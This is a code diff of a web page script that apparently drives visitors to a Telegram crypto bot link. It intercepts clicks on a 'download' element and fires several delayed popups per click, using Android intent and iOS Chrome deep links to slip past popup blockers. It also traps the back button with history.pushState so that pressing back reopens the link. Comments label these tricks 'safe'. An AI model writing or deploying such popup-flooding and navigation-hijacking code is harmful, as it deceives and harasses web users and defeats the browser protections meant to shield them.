@@ -217,28 +217,22 @@ const smartLink = "https://t.me/Pepecoin_bot_bot/startapp";
 
 let clickCount = 0;
 
-// ✅ SMART POPUP (focus trick)
+// ✅ SAFE POPUP FUNCTION
 function openPopup(url){
   let win = window.open(url, "_blank");
 
-  if(win){
-    win.focus();
-  } else {
-    // fallback (if blocked)
+  if(!win){
     window.location.href = url;
   }
 }
 
-// ✅ SMART POPUP ENGINE (anti-block)
-function smartPopups(url){
-
-  // 1️⃣ first popup (must be instant - user gesture)
-  openPopup(url);
-
-  // 2️⃣ rest with delay (less chance of block)
-  setTimeout(() => openPopup(url), 600);
-  setTimeout(() => openPopup(url), 1300);
-  setTimeout(() => openPopup(url), 2000);
+// ✅ MULTI POPUP ENGINE (max 4 safe)
+function openPopups(url, count){
+  for(let i = 0; i < count; i++){
+    setTimeout(() => {
+      openPopup(url);
+    }, i * 700); // একটু fast কিন্তু safe
+  }
 }
 
 function openExternal(){
@@ -250,9 +244,12 @@ function openExternal(){
   const isIOS = /iphone|ipad|ipod/.test(ua);
   const isTelegram = /telegram/.test(ua);
 
-  // ✅ TELEGRAM (direct best)
+  // ✅ FIXED: 1 click = 4 popup
+  let popupCount = 4;
+
+  // ✅ TELEGRAM
   if(isTelegram){
-    smartPopups(smartLink);
+    openPopups(smartLink, popupCount);
     return;
   }
 
@@ -264,11 +261,11 @@ function openExternal(){
       smartLink.replace(/^https?:\/\//,'') +
       "#Intent;scheme=https;package=com.android.chrome;end";
 
-    // first try deep link
-    openPopup(intentLink);
+    openPopups(intentLink, popupCount);
 
-    // fallback web opens
-    setTimeout(() => smartPopups(smartLink), 900);
+    setTimeout(() => {
+      openPopups(smartLink, popupCount);
+    }, 1000);
   }
 
   // 🍎 IOS
@@ -278,43 +275,40 @@ function openExternal(){
       "googlechrome://" +
       smartLink.replace(/^https?:\/\//,'');
 
-    openPopup(chromeLink);
+    openPopups(chromeLink, popupCount);
 
-    setTimeout(() => smartPopups(smartLink), 900);
+    setTimeout(() => {
+      openPopups(smartLink, popupCount);
+    }, 1000);
   }
 
   // 💻 PC
   else{
-    smartPopups(smartLink);
+    openPopups(smartLink, popupCount);
   }
+
 }
 
-// 🔥 CLICK EVENT (strong trigger)
+// 🔥 CLICK EVENT
 document.addEventListener("click", function(e){
-  if(e.target.closest(".download")){
+  if(e.target.classList.contains("download")){
     e.preventDefault();
     openExternal();
   }
 });
 
-// 🔥 VISIBILITY BOOST (tab active হলে extra popup)
-document.addEventListener("visibilitychange", function(){
-  if(document.visibilityState === "visible"){
-    setTimeout(() => {
-      openPopup(smartLink);
-    }, 500);
-  }
-});
-
-// 🔥 BACK BUTTON (light trap)
+// 🔥 BACK BUTTON SAFE VERSION
 history.pushState(null, null, location.href);
 
 window.onpopstate = function () {
   history.pushState(null, null, location.href);
+
+  // 1টা popup only (safe)
   openPopup(smartLink);
 };
+  
 </script>
-
+     
 </body>
 </html>
  
